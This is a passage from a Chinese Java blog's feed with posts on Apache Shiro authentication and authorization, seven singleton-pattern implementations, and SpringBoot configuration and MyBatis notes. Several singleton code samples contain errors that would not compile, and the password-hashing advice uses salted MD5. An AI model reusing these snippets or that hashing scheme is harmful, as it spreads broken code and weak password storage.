      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="网络编程" scheme="https://www.dzou.top/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
      <category term="IO" scheme="https://www.dzou.top/tags/IO/"/>
    
  </entry>
  
  <entry>
    <title>Shiro Java安全框架 （认证、授权）--更新中</title>
    <link href="https://www.dzou.top/post/712f837.html"/>
    <id>https://www.dzou.top/post/712f837.html</id>
    <published>2019-07-24T01:55:55.000Z</published>
    <updated>2019-08-04T08:52:53.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><p>权限管理实现对用户访问系统的控制，按照安全规则或者安全策略控制用户可以访问而且只能访问自己被授权的资源。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/1.png"><ul><li>用户认证</li><li>用户授权</li></ul><p>Authentication：身份认证 / 登录，验证用户是不是拥有相应的身份；</p><p>Authorization：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</p><hr><h2 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h2><h3 id="用户认证的流程"><a href="#用户认证的流程" class="headerlink" title="用户认证的流程"></a>用户认证的流程</h3><ul><li>判断该资源能否不认证就能访问</li><li>如果该资源需要认证才能访问，那判断该访问者是否认证</li><li>如果还没有认证，那么需要进行认证</li><li>认证通过后才能访问资源</li></ul><p>调用流程：</p><ul><li><p>首先通过 new IniSecurityManagerFactory 并指定一个 ini 配置文件来创建一个 SecurityManager 工厂；</p></li><li><p>接着获取 SecurityManager 并绑定到 SecurityUtils，这是一个全局设置，设置一次即可；</p></li><li><p>通过 SecurityUtils 得到 Subject，其会自动绑定到当前线程；如果在 web 环境在请求结束时需要解除绑定；然后获取身份验证的 Token，如用户名 / 密码；</p></li><li><p>调用 subject.login 方法进行登录，其会自动委托给 SecurityManager.login 方法进行登录；</p></li><li><p>如果身份验证失败请捕获 AuthenticationException 或其子类，常见的如： </p><ul><li>DisabledAccountException（禁用的帐号）、</li><li>LockedAccountException（锁定的帐号）、</li><li>UnknownAccountException（错误的帐号）、</li><li>ExcessiveAttemptsException（登录失败次数过多）、</li><li>IncorrectCredentialsException （错误的凭证）、</li><li>ExpiredCredentialsException（过期的凭证）等<br>具体请查看其继承关系；对于页面的错误消息展示，最好使用如 “用户名 / 密码错误” 而不是 “用户名错误”/“密码错误”，防止一些恶意用户非法扫描帐号库；</li></ul></li><li><p>最后可以调用 subject.logout 退出，其会自动委托给 SecurityManager.logout 方法退出。</p></li></ul><hr><h3 id="SecurityUtils-getSubject"><a href="#SecurityUtils-getSubject" class="headerlink" title="SecurityUtils.getSubject()"></a><strong>SecurityUtils.getSubject()</strong></h3><p>SecurityUtils.getSubject()是每个请求创建一个Subject, 并保存到ThreadContext的resources（ThreadLocal&lt;Map&lt;Object, Object&gt;&gt;）变量中，也就是一个http请求一个subject,并绑定到当前线程。</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/2.png"><h4 id="controller接受请求后"><a href="#controller接受请求后" class="headerlink" title="controller接受请求后"></a>controller接受请求后</h4><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/3.png"><h3 id="URL拦截"><a href="#URL拦截" class="headerlink" title="URL拦截"></a>URL拦截</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/4.png"><h2 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h2><p>用户授权的流程</p><ul><li>到达了用户授权环节，需要用户认证之后</li><li>用户访问资源，系统判断该用户是否有权限去操作该资源</li><li>如果该用户有权限才能够访问，如果没有权限就不能访问了</li></ul><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/5.png"><h3 id="获取角色和权限"><a href="#获取角色和权限" class="headerlink" title="获取角色和权限"></a>获取角色和权限</h3><p>一个角色role对应多个权限，一个用户user对应多个角色<br>我们通过getSysUserRoleList和getPermissions分别获取角色列表和用户权限。</p><p>然后通过<br><code>user.hasRole(&quot;&quot;)或者role.hasPermission(&quot;&quot;)</code><br>检查用户是否有对某个操作的权限</p><h3 id="密码加密和匹配"><a href="#密码加密和匹配" class="headerlink" title="密码加密和匹配"></a>密码加密和匹配</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/6.jpeg"><ul><li><strong>Subject</strong>：</li></ul><p><strong>主体，代表了当前 “用户”</strong><br>这个用户不一定是一个具体的人，与当前应用交互的任何东西都是 Subject，如网络爬虫，机器人等；即一个抽象概念；所有 Subject 都绑定到 SecurityManager，与 Subject 的所有交互都会委托给 SecurityManager；可以把 Subject 认为是一个门面；SecurityManager 才是实际的执行者；</p><ul><li><strong>SecurityManager</strong>：</li></ul><p><strong>安全管理器</strong><br>即所有与安全有关的操作都会与 SecurityManager 交互；且它管理着所有 Subject；可以看出它是 Shiro 的核心，它负责与后边介绍的其他组件进行交互，如果学习过 SpringMVC，你可以把它看成 DispatcherServlet 前端控制器；</p><ul><li><strong>Realm</strong>：</li></ul><p><strong>域，Shiro 从从 Realm 获取安全数据（如用户、角色、权限）</strong><br>就是说 SecurityManager 要验证用户身份，那么它需要从 Realm 获取相应的用户进行比较以确定用户身份是否合法；也需要从 Realm 得到用户相应的角色 / 权限进行验证用户是否能进行操作；可以把 Realm 看成 DataSource，即安全数据源。</p><hr><h3 id="1-ShiroConfig配置类"><a href="#1-ShiroConfig配置类" class="headerlink" title="1.ShiroConfig配置类"></a><strong>1.ShiroConfig配置类</strong></h3><p>添加@Configuration和@Bean</p><ul><li>（1）创建ShiroFilterFactoryBean<ul><li>1.设置安全管理器SecurityManager </li><li>2.创建Shiro内置过滤器，实现相关url拦截，使用LinkedHashMap添加 </li><li>3.设置调整页面 </li><li>4.设置过滤器</li></ul></li></ul><pre><code class="java">/**         * anon:所有url都都可以匿名访问         * authc: 需要认证才能进行访问         * user: 如果使用 rememberme 可以直接访问         * perms：该资源必须得到资源权限才可以访问         * role：该资源必须得到角色权限才可以访问         */</code></pre><ul><li>（2）创建DefaultWebSecurityManager（主要关联自定义realm）</li><li>（3）创建自定义Realm</li><li>（4 可选）配置ShiroDialect,配合thymeleaf使用</li></ul><h3 id="2-自定义Realm类"><a href="#2-自定义Realm类" class="headerlink" title="2.自定义Realm类"></a><strong>2.自定义Realm类</strong></h3><ul><li><p>（1）可实现自定义的Credentials匹配类（实现自定义密码验证，通过添加到PostContruct作为类初始化执行）</p></li><li><p>（2）实现用户授权添加过程</p><pre><code class="java">    protected AuthorizationInfo doGetAuthorizationInfo</code></pre></li><li><p>（3）实现用户认证过程</p><pre><code class="java">  protected AuthenticationInfo doGetAuthenticationInfo</code></pre></li></ul><hr><h4 id="自定义密码验证和加密（双MD5加盐salt-随机数）"><a href="#自定义密码验证和加密（双MD5加盐salt-随机数）" class="headerlink" title="自定义密码验证和加密（双MD5加盐salt 随机数）"></a><strong>自定义密码验证和加密（双MD5加盐salt 随机数）</strong></h4><p>Realm在验证用户身份的时候，要进行密码匹配。最简单的情况就是明文直接匹配，然后就是加密匹配，这里的匹配工作则就是交给CredentialsMatcher来完成的。</p><pre><code class="java">public interface CredentialsMatcher {    boolean doCredentialsMatch(AuthenticationToken token, AuthenticationInfo info);}</code></pre><p>在涉及到密码存储问题上，应该加密 / 生成密码摘要存储，而不是存储明文密码。比如之前的 600w csdn 账号泄露对用户可能造成很大损失，因此应加密 / 生成不可逆的摘要方式存储。<br><strong>这时就需要自定义一个CustomCredentialsMatcher 继承SimpleCredentialsMatcher 实现密码验证</strong></p><hr><h2 id="RememberMe"><a href="#RememberMe" class="headerlink" title="RememberMe"></a>RememberMe</h2><ul><li>cookie</li><li>rememberMeCookieManager</li></ul><h3 id="配置RememberMeManager"><a href="#配置RememberMeManager" class="headerlink" title="配置RememberMeManager"></a>配置RememberMeManager</h3><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/7.png"><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><ul><li><p><strong>使用缓存存储session（单服务器使用EhCacheManager）</strong></p></li><li><p><strong>但是在分布式系统中，服务器集群情况下，EhCacheManager无法解决数据共享（会多次查询数据库），则选择使用redis作为缓存</strong></p></li></ul><h3 id="Redis实现shiro缓存"><a href="#Redis实现shiro缓存" class="headerlink" title="Redis实现shiro缓存"></a>Redis实现shiro缓存</h3><ul><li><p><strong>分布式共享session和授权信息需要把session和授权持久化到数据库或者缓存 shiro集群为了防止多次插查询数据库</strong></p></li><li><p><strong>自定义实现类:或者使用crazycake开源shiro-redis实现好的工具</strong></p><ul><li><strong><em>RedisSessionDAO</em></strong>  可以继承EnterpriseCacheSessionDAO实现session控制</li><li><strong><em>RedisCache</em></strong>  继承Cache类实现具体redis操作缓存（remove、get、set、keys</li><li><strong><em>RedisCacheManager</em></strong> 实现接口CacheManager的getCache获得RedisCache交给securityManager管理</li></ul><p> <strong>使用了ConcurrentMap管理数据和缓存，更加高效</strong></p></li></ul><h3 id="缓存session和授权信息"><a href="#缓存session和授权信息" class="headerlink" title="缓存session和授权信息"></a>缓存session和授权信息</h3><h4 id="１．基于EhCache缓存（效率不高，无法解决分布式问题）"><a href="#１．基于EhCache缓存（效率不高，无法解决分布式问题）" class="headerlink" title="１．基于EhCache缓存（效率不高，无法解决分布式问题）"></a>１．基于EhCache缓存（效率不高，无法解决分布式问题）</h4><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/8.png"><h4 id="２．基于Redis缓存-CrazyCake-shiro-redis开源插件，效率高，可实现集群共享）"><a href="#２．基于Redis缓存-CrazyCake-shiro-redis开源插件，效率高，可实现集群共享）" class="headerlink" title="２．基于Redis缓存(CrazyCake　shiro-redis开源插件，效率高，可实现集群共享）"></a>２．基于Redis缓存(CrazyCake　shiro-redis开源插件，效率高，可实现集群共享）</h4><p>RedisConfig加载配置类</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/9.png"><p>sessionManager管理session</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/10.png"><p>创建cookie集群共享sessionid</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/shiro/11.png"><h2 id="Shiro配置类"><a href="#Shiro配置类" class="headerlink" title="Shiro配置类"></a>Shiro配置类</h2><h3 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a>ShiroFilterFactoryBean</h3><p>一个工厂Bean，将ShiroFilter实例对象注入到Spring容器中去，这样Shiro基于url的方式进行请求过滤处理，把安全管理器添加到该bean中。</p><h3 id="SecurityManager-管理认证和授权"><a href="#SecurityManager-管理认证和授权" class="headerlink" title="SecurityManager 管理认证和授权"></a>SecurityManager 管理认证和授权</h3><h4 id="1-SessionManager-（管理session"><a href="#1-SessionManager-（管理session" class="headerlink" title="1.SessionManager　（管理session)"></a>1.SessionManager　（管理session)</h4><h5 id="（1）SessionDao-（自定义或者crazycake）"><a href="#（1）SessionDao-（自定义或者crazycake）" class="headerlink" title="（1）SessionDao （自定义或者crazycake）"></a>（1）SessionDao （自定义或者crazycake）</h5><h5 id="（2）cookie-（存放JESSIONID）"><a href="#（2）cookie-（存放JESSIONID）" class="headerlink" title="（2）cookie　（存放JESSIONID）"></a>（2）cookie　（存放JESSIONID）</h5><h5 id="（3）redisManager-（管理redis）"><a href="#（3）redisManager-（管理redis）" class="headerlink" title="（3）redisManager　（管理redis）"></a>（3）redisManager　（管理redis）</h5><h4 id="2-CacheManager-保存用户信息和授权信息"><a href="#2-CacheManager-保存用户信息和授权信息" class="headerlink" title="2.CacheManager　保存用户信息和授权信息"></a>2.CacheManager　保存用户信息和授权信息</h4><h5 id="方式一：EhCache实现缓存管理器-编写自定义缓存方式配置文件shiro-ehcache-xml"><a href="#方式一：EhCache实现缓存管理器-编写自定义缓存方式配置文件shiro-ehcache-xml" class="headerlink" title="方式一：EhCache实现缓存管理器,编写自定义缓存方式配置文件shiro-ehcache.xml"></a>方式一：EhCache实现缓存管理器,编写自定义缓存方式配置文件shiro-ehcache.xml</h5><h5 id="方式二：redis-做缓存"><a href="#方式二：redis-做缓存" class="headerlink" title="方式二：redis 做缓存"></a>方式二：redis 做缓存</h5><h5 id="3-RememberMeManager"><a href="#3-RememberMeManager" class="headerlink" title="3.RememberMeManager"></a>3.RememberMeManager</h5><p>添加SimpleCookie作为RememberMeCookie</p><h4 id="4-MyShiroRealm（自定义认证授权实现Realm类）"><a href="#4-MyShiroRealm（自定义认证授权实现Realm类）" class="headerlink" title="4.MyShiroRealm（自定义认证授权实现Realm类）"></a>4.MyShiroRealm（自定义认证授权实现Realm类）</h4><ul><li>doGetAuthorizationInfo　授权</li><li>doGetAuthenticationInfo　认证</li><li>credentialsMatcher　配置凭证匹配器，双md5加盐加密</li></ul>]]></content>
    
    <summary type="html">
    
      Shiro JavaWeb 安全框架，实现权限管理和用户认证
    
    </summary>
    
      <category term="Web安全" scheme="https://www.dzou.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="安全" scheme="https://www.dzou.top/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="Redis" scheme="https://www.dzou.top/tags/Redis/"/>
    
      <category term="记住我" scheme="https://www.dzou.top/tags/%E8%AE%B0%E4%BD%8F%E6%88%91/"/>
    
      <category term="单点登录" scheme="https://www.dzou.top/tags/%E5%8D%95%E7%82%B9%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式--单例模式(7种)</title>
    <link href="https://www.dzou.top/post/f90c55c.html"/>
    <id>https://www.dzou.top/post/f90c55c.html</id>
    <published>2019-07-24T01:50:57.000Z</published>
    <updated>2019-08-04T04:19:29.697Z</updated>
    
    <content type="html"><![CDATA[<h2 id="单例模式（七种）"><a href="#单例模式（七种）" class="headerlink" title="单例模式（七种）"></a>单例模式（七种）</h2><h3 id="1-饿汉模式"><a href="#1-饿汉模式" class="headerlink" title="1. 饿汉模式"></a><strong>1. 饿汉模式</strong></h3><pre><code class="java">public class Singleton {       private static Singleton instance = new Singleton();       private Singleton (){     }     public static Singleton getInstance() {       return instance;       }   }  </code></pre><p>这种方式在类加载时就完成了初始化，所以类加载较慢，但获取对象的速度快。 这种方式基于类加载机制避免了多线程的同步问题，但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化instance显然没有达到懒加载的效果。</p><hr><h3 id="2-懒汉模式（线程不安全）"><a href="#2-懒汉模式（线程不安全）" class="headerlink" title="2. 懒汉模式（线程不安全）"></a><strong>2. 懒汉模式（线程不安全）</strong></h3><pre><code class="java">public class Singleton {        private static Singleton instance;        private Singleton (){      }         public static Singleton getInstance() {        if (instance == null) {            instance = new Singleton();        }        return instance;        }   }  </code></pre><p>懒汉模式申明了一个静态对象，在用户第一次调用时初始化，虽然节约了资源，但第一次加载时需要实例化，反映稍慢一些，而且在多线程不能正常工作。</p><hr><h3 id="3-懒汉模式（线程安全）"><a href="#3-懒汉模式（线程安全）" class="headerlink" title="3. 懒汉模式（线程安全）"></a><strong>3. 懒汉模式（线程安全）</strong></h3><pre><code class="java">public class Singleton {        private static Singleton instance;        private Singleton (){      }      public static synchronized Singleton getInstance() {        if (instance == null) {            instance = new Singleton();        }        return instance;        }   }  </code></pre><p>这种写法能够在多线程中很好的工作，但是每次调用getInstance方法时都需要进行同步，造成不必要的同步开销，而且大部分时候我们是用不到同步的，所以不建议用这种模式。</p><hr><h3 id="4-双重检查模式-（DCL）"><a href="#4-双重检查模式-（DCL）" class="headerlink" title="4. 双重检查模式 （DCL）"></a><strong>4. 双重检查模式 （DCL）</strong></h3><pre><code class="java">public class Singleton {        private volatile static Singleton instance;        private Singleton (){      }         public static Singleton getInstance() {        if (instance== null) {            synchronized (Singleton.class) {            if (instance== null) {                instance= new Singleton();            }           }       }       return singleton;       }   }  </code></pre><p>这种写法在getSingleton方法中对singleton进行了两次判空，第一次是为了不必要的同步，第二次是在singleton等于null的情况下才创建实例。在这里用到了volatile关键字这里使用volatile会或多或少的影响性能，<br>但考虑到程序的正确性，牺牲这点性能还是值得的。 DCL优点是资源利用率高，第一次执行getInstance时单例对象才被实例化，效率高。缺点是第一次加载时反应稍慢一些，在高并发环境下也有一定的缺陷，虽然发生的概率很小。DCL虽然在一定程度解决了资源的消耗和多余的同步，线程安全等问题，但是他还是在某些情况会出现失效的问题，也就是DCL失效，在《java并发编程实践》一书建议用静态内部类单例模式来替代DCL。</p><hr><h3 id="5-静态内部类单例模式"><a href="#5-静态内部类单例模式" class="headerlink" title="5. 静态内部类单例模式"></a><strong>5. 静态内部类单例模式</strong></h3><pre><code class="java">public class Singleton {     private Singleton(){    }      public static Singleton getInstance(){          return SingletonHolder.sInstance;      }      private static class SingletonHolder {          private static final Singleton sInstance = new Singleton();      }  } </code></pre><p>第一次加载Singleton类时并不会初始化sInstance，只有第一次调用getInstance方法时虚拟机加载SingletonHolder 并初始化sInstance ，这样不仅能确保线程安全也能保证Singleton类的唯一性，所以推荐使用静态内部类单例模式。</p><hr><h3 id="6-枚举单例"><a href="#6-枚举单例" class="headerlink" title="6. 枚举单例"></a><strong>6. 枚举单例</strong></h3><pre><code class="java">public enum Singleton {       INSTANCE;       public void doSomeThing() {       }   }  </code></pre><p>枚举单例的优点就是简单，但是大部分应用开发很少用枚举，可读性并不是很高，不建议用。</p><hr><p>述讲的几种单例模式实现中，有一种情况下他们会重新创建对象，那就是反序列化，将一个单例实例对象写到磁盘再读回来，从而获得了一个实例。反序列化操作提供了readResolve方法，这个方法可以让开发人员控制对象的反序列化。在上述的几个方法示例中如果要杜绝单例对象被反序列化是重新生成对象，就必须加入如下方法：</p><pre><code class="java">private Object readResolve() throws ObjectStreamException{return singleton;}</code></pre><h3 id="7-使用容器实现单例模式"><a href="#7-使用容器实现单例模式" class="headerlink" title="7.使用容器实现单例模式"></a><strong>7.使用容器实现单例模式</strong></h3><pre><code class="java">public class SingletonManager { 　　private static Map&lt;String, Object&gt; objMap = new HashMap&lt;String,Object&gt;();　　private Singleton() { 　　}　　public static void registerService(String key, Objectinstance) {　　　　if (!objMap.containsKey(key) ) {　　　　　　objMap.put(key, instance) ;　　　　}　　}　　public static ObjectgetService(String key) {　　　　return objMap.get(key) ;　　}}</code></pre><p>用SingletonManager 将多种的单例类统一管理，在使用时根据key获取对象对应类型的对象。这种方式使得我们可以管理多种类型的单例，并且在使用时可以通过统一的接口进行获取操作，降低了用户的使用成本，也对用户隐藏了具体实现，降低了耦合度。</p>]]></content>
    
    <summary type="html">
    
      单例模式（Singleton Pattern）是 Java 中最简单的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot学习笔记--更新中</title>
    <link href="https://www.dzou.top/post/cfc248db.html"/>
    <id>https://www.dzou.top/post/cfc248db.html</id>
    <published>2019-07-24T01:45:28.000Z</published>
    <updated>2019-08-02T11:53:39.829Z</updated>
    
    <content type="html"><![CDATA[<p>##SpringBoot<br>Spring Boot 是所有基于 Spring 开发的项目的起点。Spring Boot 的设计是为了让你尽可能快的跑起来 Spring 应用程序并且尽可能减少你的配置文件。</p><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>无需配置xml，无代码生成</li><li>无需打包war，而是jar</li></ul><h3 id="微服务"><a href="#微服务" class="headerlink" title="微服务"></a>微服务</h3><p>一组小型服务，通过http进行沟通<br>每个单元度</p><h3 id="单体应用"><a href="#单体应用" class="headerlink" title="单体应用"></a>单体应用</h3><p>传统web应用,所有功能和模块全部部署在一个应用里</p><h3 id="jar包运行"><a href="#jar包运行" class="headerlink" title="jar包运行"></a>jar包运行</h3><p>Spring-boot-maven-plugin可以用maven把springboot应用打jar</p><h3 id="pom文件探究"><a href="#pom文件探究" class="headerlink" title="pom文件探究"></a>pom文件探究</h3><ul><li><p>springboot-starter-dependencies：版本仲裁中心，以后导入依赖不需要写版本，在父pom中声明</p></li><li><p>springboot-starter-web：场景启动器 帮我们导入运行需要的组件：tomcat springweb、webmvc</p></li></ul><h3 id="主程序类"><a href="#主程序类" class="headerlink" title="主程序类"></a>主程序类</h3><ul><li>@SprignbootAppliction 标志类（Springboot主配置类）</li><li>@SpringbootConfiguration 类（Springboot一个配置类） 底层使用Configuration实现</li><li>@EnableAutoConfiguration 类（开启自动配置） springboot帮我们自动配置    </li><li>@AutoConfigurationPackage自动配置包（主配置类所在包下类扫描）</li></ul><blockquote><p>@EnableAutoConfiguration(exclude = {DataSourceAutoConfiguration.class})<br>@Configuration<br>@ComponentScan<br>这三个等同于@SpringBootApplication</p></blockquote><blockquote><p>@RestController等同于 @ResponseBody和@Controller</p></blockquote><p>自动配置很强大<br>springboot下autoconfiguration包内存储我们需要的类，sringboot帮我们配置</p><h3 id="创建SpringBoot项目"><a href="#创建SpringBoot项目" class="headerlink" title="创建SpringBoot项目"></a>创建SpringBoot项目</h3><p>Spring Initialize可以帮助我们创建SpringBoot项目</p><h3 id="Springboot配置文件"><a href="#Springboot配置文件" class="headerlink" title="Springboot配置文件"></a>Springboot配置文件</h3><h4 id="全局配置文件"><a href="#全局配置文件" class="headerlink" title="全局配置文件"></a>全局配置文件</h4><p>命名固定</p><ul><li>application.properties</li><li>application.yml<br>yaml： 以数据为中心，比xml和json更适合</li></ul><h4 id="配置文件注入值"><a href="#配置文件注入值" class="headerlink" title="配置文件注入值"></a>配置文件注入值</h4><ul><li>1.@ConfigurationProperties（prefix=“”）支持jsr303数据校验</li><li>2.属性上添加 @Value（￥{user.username}）复杂类型不能封装，只能使用基本数据类型</li></ul><h4 id="PropertySource使用路径下的配置文件"><a href="#PropertySource使用路径下的配置文件" class="headerlink" title="@PropertySource使用路径下的配置文件"></a>@PropertySource使用路径下的配置文件</h4><p>例：</p><pre><code class="java">@PropertySource(value = &quot;{classpath:user.properties}&quot;)</code></pre><h4 id="加入我们编写的配置文件"><a href="#加入我们编写的配置文件" class="headerlink" title="加入我们编写的配置文件"></a>加入我们编写的配置文件</h4><p>1.@ImportResource 标注在配置类上（不推荐）</p><pre><code class="java">@ImportResource(value = {&quot;classpath:bean.xml&quot;})</code></pre><p>2.推荐使用注解给容器中添加组件（编写配置类）<br>@Bean 标注方法上 返回值为该组件 方法名为该组件id</p><pre><code class="yml">#YAML格式environments:    dev:        url: http://dev.bar.com        name: Developer Setup    prod:        url: http://foo.bar.com        name: My Cool Appmy:    servers:        - dev.bar.com        - foo.bar.com</code></pre><blockquote><p>处理器：写配置文件有提示<br>我们可以添加下面依赖</p></blockquote><pre><code class="xml">&lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;            &lt;optional&gt;true&lt;/optional&gt;        &lt;/dependency&gt;</code></pre><h3 id="SpringBoot占位符"><a href="#SpringBoot占位符" class="headerlink" title="SpringBoot占位符"></a>SpringBoot占位符</h3><ul><li>随机数：可以在配置文件中使用#{random.uuif}等</li><li>占位符获取之前设置的值，如果没有，可以使用默认值#{userAge：默认值}</li></ul><h3 id="profile"><a href="#profile" class="headerlink" title="profile"></a>profile</h3><p><strong>Spring对不同环境提供不同的配置功能的支持（发布、生产、测试等环境）</strong><br>例：</p><ul><li>application_dev.yml</li><li>application_prod.yml</li></ul><p>yml、properties<br>可以使用spring.profiles.active=dev,prod也可以在命令行使用–spring.profiles.active=dev,prod参数</p><h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><p>springboot能自动适应所有的日志框架 底层使用slf4j和logback</p><p><img src="https://img-blog.csdnimg.cn/2019060510505348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h4><p>springboot默认级别是info级别（只输出info和以后级别）</p><ul><li>trace</li><li>debug</li><li>info</li><li>warn</li><li>error</li></ul><h4 id="调整级别"><a href="#调整级别" class="headerlink" title="调整级别"></a>调整级别</h4><pre><code class="yml">#com.dingxiang下的日志都以trace级别输出logging.level.com.dingxiang=trace</code></pre><p>springboot指定路径生成日志文件</p><pre><code>logging.path=/spring/loglogging.file=springboot_logging</code></pre><blockquote><p>设置自定义日志格式 logging.pattern.console</p></blockquote><h4 id="日志指定配置"><a href="#日志指定配置" class="headerlink" title="日志指定配置"></a>日志指定配置</h4><p>在指定路径下放置对应的日志文件 ex：在根目录下放置logback.xml<br>logback-spring.xm可以使用springboot的高级功能可以设置多profile环境配置</p><h4 id="切换日志框架"><a href="#切换日志框架" class="headerlink" title="切换日志框架"></a>切换日志框架</h4><p>所有的日志都统一到slf4j的解决方案： </p><ol><li>将系统中其他日志框架先排除出去； </li><li>用中间包来替换原有的日志框架； </li><li>导入slf4j其他的实现。</li></ol><h2 id="SpringBoot-Web-开发"><a href="#SpringBoot-Web-开发" class="headerlink" title="SpringBoot Web 开发"></a>SpringBoot Web 开发</h2><h3 id="pom资源引入：webjars"><a href="#pom资源引入：webjars" class="headerlink" title="pom资源引入：webjars"></a>pom资源引入：webjars</h3><p><a href="https://www.webjars.org/" rel="external nofollow noopener noreferrer" target="_blank"><br>webjars maven</a></p><h4 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h4><p>默认情况下，Spring Boot 将在 classpath 或者 ServletContext 根目录下从名为</p><pre><code>/static /public/resources /META-INF/resources</code></pre><p>目录中服务静态内容。它使用了 Spring MVC 的 ResourceHttpRequestHandler</p><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><blockquote><p>模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</p></blockquote><p>springboot 使用的thymeleaf<br>放在classpath：src/main/resources/templates</p><p><img src="https://img-blog.csdnimg.cn/20190605170117401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>(1)th任意html元素<br>th:text 文本  th:class th:id<br>(2)方法调用<br>语法案例：</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;成功&lt;/h1&gt;&lt;div th:text=&quot;${hello}&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="扩展SpringMVC"><a href="#扩展SpringMVC" class="headerlink" title="扩展SpringMVC"></a>扩展SpringMVC</h3><p>编写配置类继承WebMvcConfigurerAdapter 实现对应的方法<br>使得springboot既可以使用自动配置，也可以使用我们的扩展配置</p><p>eg 扩展controller：</p><pre><code class="java">public void addViewControllers(ViewControllerRegistry registry) {//        super.addViewControllers(registry);registry.addViewController(&quot;/&quot;).setViewName(&quot;success&quot;);</code></pre><h2 id="Springboot-整合Mybatis"><a href="#Springboot-整合Mybatis" class="headerlink" title="Springboot 整合Mybatis"></a>Springboot 整合Mybatis</h2><h3 id="maven依赖"><a href="#maven依赖" class="headerlink" title="maven依赖"></a>maven依赖</h3><pre><code class="xml">&lt;!-- 最重要的是这个POM配置，MyBatis相关操作都在这个包中 --&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;        &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;        &lt;version&gt;1.1.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;!-- MySql数据库连接包 --&gt;    &lt;dependency&gt;        &lt;groupId&gt;mysql&lt;/groupId&gt;        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;    &lt;/dependency&gt;</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>(1)application.yml或者properties配置datasource（Springboot自动帮你配置sqlsessionfactory 默认使用的是HikariDataSource）</p><pre><code class="properties">spring.datasource.url=jdbc:mysql://localhost:3306/springboot?serverTimezone=GMT&amp;autoReconnect=truespring.datasource.username=rootspring.datasource.password=spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</code></pre><pre><code class="yml"># mysqlspring:  datasource:    url: jdbc:mysql://localhost:3306/springboot?serverTimezone=GMT&amp;autoReconnect=true    username: root    password: 